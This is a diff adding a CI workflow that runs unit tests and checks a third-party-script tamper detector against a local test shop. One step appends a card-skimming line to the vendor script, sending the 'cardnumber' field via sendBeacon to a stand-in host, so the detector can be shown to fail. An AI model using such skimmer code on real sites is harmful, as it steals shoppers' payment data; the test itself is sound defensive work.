@@ -1,0 +1,68 @@
+name: tests
+
+on:
+  push:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  unit:
+    # 24.04 still ships Python 3.9; ubuntu-latest (26.04) does not
+    runs-on: ubuntu-24.04
+    strategy:
+      fail-fast: false
+      matrix:
+        python: ["3.9", "3.11", "3.13"]
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+      - uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b # v5.3.0
+        with:
+          python-version: ${{ matrix.python }}
+      - run: python -m unittest discover -s . -p "test_*.py" -v
+
+  action:
+    # A real HTTPS shop and vendor: save a baseline, hack the vendor script, the action must fail
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+      - name: Start a test shop and a third-party vendor
+        run: |
+          mkdir -p /tmp/shop/site /tmp/shop/vendor && cd /tmp/shop
+          openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 1 -subj "/CN=localhost" 2>/dev/null
+          echo "<script src='https://localhost:8902/snippet.js'></script>" > site/index.html
+          echo "window.optly={push:function(e){navigator.sendBeacon('https://log.vendor.test/e',e)}};" > vendor/snippet.js
+          cat > serve.py <<'PY'
+          import http.server, ssl, sys, functools
+          H = functools.partial(http.server.SimpleHTTPRequestHandler, directory=sys.argv[2])
+          srv = http.server.ThreadingHTTPServer(("127.0.0.1", int(sys.argv[1])), H)
+          ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain("cert.pem", "key.pem")
+          srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
+          srv.serve_forever()
+          PY
+          nohup python3 serve.py 8901 site >/dev/null 2>&1 &
+          nohup python3 serve.py 8902 vendor >/dev/null 2>&1 &
+          sleep 1
+      - name: Save the baseline
+        uses: ./
+        with:
+          urls: https://127.0.0.1:8901/
+          baseline: /tmp/shop/baseline.json
+          update: "true"
+          insecure: "true"
+      - name: Hack the vendor script
+        run: |
+          echo ";document.addEventListener('keyup',function(){var f=document.querySelectorAll('input');navigator.sendBeacon('https://stats-cdn.example/c',document.getElementById('cardnumber').value)})" >> /tmp/shop/vendor/snippet.js
+      - name: Check again (should fail)
+        id: hacked
+        continue-on-error: true
+        uses: ./
+        with:
+          urls: https://127.0.0.1:8901/
+          baseline: /tmp/shop/baseline.json
+          insecure: "true"
+      - name: Check outcome
+        env:
+          OUTCOME: ${{ steps.hacked.outcome }}
+        run: test "$OUTCOME" = failure
